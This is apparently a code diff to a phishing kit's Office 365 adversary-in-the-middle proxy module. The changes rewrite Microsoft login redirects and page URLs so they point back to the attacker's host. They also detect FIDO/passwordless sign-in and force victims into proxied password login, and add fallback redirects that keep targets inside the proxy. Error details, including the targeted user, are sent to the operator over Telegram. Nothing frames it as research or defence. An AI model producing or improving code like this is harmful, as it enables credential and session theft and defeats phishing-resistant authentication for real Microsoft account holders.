@@ -538,12 +538,35 @@ class Office365Module(BaseModule):
             return self._proxy_to_microsoft(microsoft_url)
             
         except Exception as e:
+            import traceback
+            tb = traceback.format_exc()
             self.log(f"[AiTM] Proxy endpoint error: {e}")
-            # Send error notification
-            error_msg = f"*⚠️ AiTM Proxy Error*\nError: `{str(e)}`\nFalling back to direct redirect..."
+            self.log(f"[AiTM] Proxy endpoint traceback: {tb}")
+            
+            # Send error notification with more details
+            error_msg = (
+                f"*⚠️ AiTM Proxy Error*\n"
+                f"Error: `{str(e)}`\n"
+                f"URL: `{request.url}`\n"
+                f"Method: `{request.method}`\n"
+                f"User: `{getattr(self, 'user', 'Unknown')}`\n"
+                f"🔄 Attempting fallback..."
+            )
             self.send_telegram(error_msg)
-            # Fallback to direct redirect
-            return redirect("https://login.microsoftonline.com/", code=302)
+            
+            # Better fallback based on user type
+            if hasattr(self, 'user') and self.user:
+                personal_domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'yahoo.com']
+                is_personal = any(domain in self.user.lower() for domain in personal_domains)
+                
+                if is_personal:
+                    fallback_url = f"https://login.live.com/login.srf?username={self.user}&wa=wsignin1.0&wtrealm=uri:WindowsLiveID&wctx=bk%3d1456841834%26bru%3dhttps%253a%252f%252fwww.office.com%252f&wreply=https://www.office.com/landingv2.aspx&lc=1033&id=292666&mkt=EN-US&psi=office365&uiflavor=web&forcepassword=1&amtcb=1"
+                else:
+                    fallback_url = f"https://login.microsoftonline.com/common/oauth2/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&response_type=code&redirect_uri=https://www.office.com/&scope=openid%20profile&login_hint={self.user}"
+            else:
+                fallback_url = "https://login.microsoftonline.com/"
+            
+            return redirect(fallback_url, code=302)
 
     def proxy_catch_all(self, path):
         """Handle all paths under /proxy/ for complete Microsoft login flow"""
@@ -558,13 +581,18 @@ class Office365Module(BaseModule):
                 
                 if is_personal:
                     # For personal accounts, route to appropriate Microsoft consumer domain
-                    if 'consumers' in path or 'fido' in path:
+                    if 'consumers' in path or 'fido' in path or 'microsoft.com' in path:
                         target_url = f"https://login.microsoft.com/{path}"
+                    elif 'account' in path:
+                        target_url = f"https://account.live.com/{path}"
                     else:
                         target_url = f"https://login.live.com/{path}"
                 else:
                     # For organizational accounts, use login.microsoftonline.com
-                    target_url = f"https://login.microsoftonline.com/{path}"
+                    if 'account' in path and 'microsoft.com' in path:
+                        target_url = f"https://account.microsoft.com/{path}"
+                    else:
+                        target_url = f"https://login.microsoftonline.com/{path}"
             else:
                 # Default to organizational
                 target_url = f"https://login.microsoftonline.com/{path}"
@@ -638,13 +666,54 @@ class Office365Module(BaseModule):
                 if key.lower() not in ['content-encoding', 'content-length', 'transfer-encoding', 'connection']:
                     response_headers[key] = value
             
+            # Handle redirects properly by rewriting Location headers
+            if 'Location' in response_headers:
+                location = response_headers['Location']
+                current_host = flask_request.host
+                
+                # Rewrite Microsoft URLs in Location header to point back to our proxy
+                location_replacements = [
+                    ('https://login.microsoftonline.com/', f'https://{current_host}/proxy/'),
+                    ('https://login.live.com/', f'https://{current_host}/proxy/'),
+                    ('https://login.microsoft.com/', f'https://{current_host}/proxy/'),
+                    ('https://account.live.com/', f'https://{current_host}/proxy/'),
+                    ('https://account.microsoft.com/', f'https://{current_host}/proxy/'),
+                ]
+                
+                for old_url, new_url in location_replacements:
+                    if location.startswith(old_url):
+                        location = location.replace(old_url, new_url, 1)
+                        self.log(f"[AiTM] Rewrote redirect location: {old_url} -> {new_url}")
+                        break
+                
+                response_headers['Location'] = location
+            
             # Rewrite response content to redirect Microsoft URLs back to our proxy
             content = resp.content
+            
+            # Check for empty or invalid content that could cause blank screens
+            if not content or len(content) == 0:
+                self.log(f"[AiTM] WARNING: Empty content received from Microsoft (status: {resp.status_code})")
+                # For empty content, redirect to a known working URL
+                if hasattr(self, 'user') and self.user:
+                    personal_domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'yahoo.com']
+                    is_personal = any(domain in self.user.lower() for domain in personal_domains)
+                    
+                    if is_personal:
+                        retry_url = f"https://{flask_request.host}/proxy/login.srf?username={self.user}&wa=wsignin1.0&wtrealm=uri:WindowsLiveID&wctx=bk%3d1456841834%26bru%3dhttps%253a%252f%252fwww.office.com%252f&wreply=https://www.office.com/landingv2.aspx&lc=1033&id=292666&mkt=EN-US&psi=office365&uiflavor=web&forcepassword=1&amtcb=1"
+                    else:
+                        retry_url = f"https://{flask_request.host}/proxy/common/oauth2/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&response_type=code&redirect_uri=https://www.office.com/&scope=openid%20profile&login_hint={self.user}"
+                    
+                    return redirect(retry_url, code=302)
+            
             if resp.headers.get('content-type', '').startswith('text/html'):
                 try:
                     # Decode content and rewrite Microsoft URLs
                     content_str = content.decode('utf-8', errors='ignore')
                     current_host = flask_request.host
+                    
+                    # Log content size for debugging
+                    self.log(f"[AiTM] Processing HTML content, size: {len(content_str)} chars")
                     
                     # Check for FIDO/passwordless authentication redirects and block them
                     fido_indicators = [
@@ -668,7 +737,7 @@ class Office365Module(BaseModule):
                     fido_in_url = any(indicator in current_url for indicator in fido_indicators)
                     fido_in_content = any(indicator in content_str for indicator in fido_indicators)
                     
-                    # If FIDO flow detected, redirect to password-based flow
+                    # If FIDO flow detected, redirect to password-based flow through proxy
                     if fido_in_url or fido_in_content:
                         self.log(f"[AiTM] FIDO/passwordless flow detected, redirecting to password flow")
                         if hasattr(self, 'user') and self.user:
@@ -676,12 +745,14 @@ class Office365Module(BaseModule):
                             is_personal = any(domain in self.user.lower() for domain in personal_domains)
                             
                             if is_personal:
-                                # Force redirect to password login for personal accounts
-                                password_url = f"https://login.live.com/login.srf?username={self.user}&wa=wsignin1.0&wtrealm=uri:WindowsLiveID&wctx=bk%3d1456841834%26bru%3dhttps%253a%252f%252fwww.office.com%252f&wreply=https://www.office.com/landingv2.aspx&lc=1033&id=292666&mkt=EN-US&psi=office365&uiflavor=web&forcepassword=1&amtcb=1"
+                                # Force redirect to password login for personal accounts - THROUGH PROXY
+                                password_params = f"username={self.user}&wa=wsignin1.0&wtrealm=uri:WindowsLiveID&wctx=bk%3d1456841834%26bru%3dhttps%253a%252f%252fwww.office.com%252f&wreply=https://www.office.com/landingv2.aspx&lc=1033&id=292666&mkt=EN-US&psi=office365&uiflavor=web&forcepassword=1&amtcb=1"
+                                password_url = f"https://{current_host}/proxy/login.srf?{password_params}"
                                 return redirect(password_url, code=302)
                             else:
-                                # Force redirect to password login for organizational accounts
-                                password_url = f"https://login.microsoftonline.com/common/login?username={self.user}&login_hint={self.user}&forcepassword=1"
+                                # Force redirect to password login for organizational accounts - THROUGH PROXY
+                                password_params = f"username={self.user}&login_hint={self.user}&forcepassword=1"
+                                password_url = f"https://{current_host}/proxy/common/login?{password_params}"
                                 return redirect(password_url, code=302)
                     
                     # Replace Microsoft URLs with our proxy URLs
@@ -705,10 +776,35 @@ class Office365Module(BaseModule):
                     content = content_str.encode('utf-8')
                     self.log(f"[AiTM] Rewrote {len(replacements)} URL patterns in HTML response")
                     
+                    # Update Content-Length header since content size may have changed
+                    response_headers['Content-Length'] = str(len(content))
+                    
                 except Exception as e:
                     self.log(f"[AiTM] Error rewriting URLs: {e}")
                     # Use original content if rewriting fails
                     pass
+            else:
+                # For non-HTML content, preserve original length
+                if content:
+                    response_headers['Content-Length'] = str(len(content))
+            
+            # Handle special cases that might cause blank screens
+            if resp.status_code >= 400:
+                self.log(f"[AiTM] Microsoft returned error status {resp.status_code}, content: {content.decode('utf-8', errors='ignore')[:200]}")
+                
+                # If Microsoft returns an error, we might want to redirect to a working URL
+                if resp.status_code in [404, 400, 403]:
+                    self.log(f"[AiTM] Error status {resp.status_code}, attempting fallback redirect")
+                    if hasattr(self, 'user') and self.user:
+                        personal_domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'yahoo.com']
+                        is_personal = any(domain in self.user.lower() for domain in personal_domains)
+                        
+                        if is_personal:
+                            fallback_url = f"https://{flask_request.host}/proxy/login.srf?username={self.user}&wa=wsignin1.0&wtrealm=uri:WindowsLiveID&wctx=bk%3d1456841834%26bru%3dhttps%253a%252f%252fwww.office.com%252f&wreply=https://www.office.com/landingv2.aspx&lc=1033&id=292666&mkt=EN-US&psi=office365&uiflavor=web&forcepassword=1&amtcb=1"
+                        else:
+                            fallback_url = f"https://{flask_request.host}/proxy/common/oauth2/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&response_type=code&redirect_uri=https://www.office.com/&scope=openid%20profile&login_hint={self.user}"
+                        
+                        return redirect(fallback_url, code=302)
             
             # Create Flask response
             flask_response = Response(
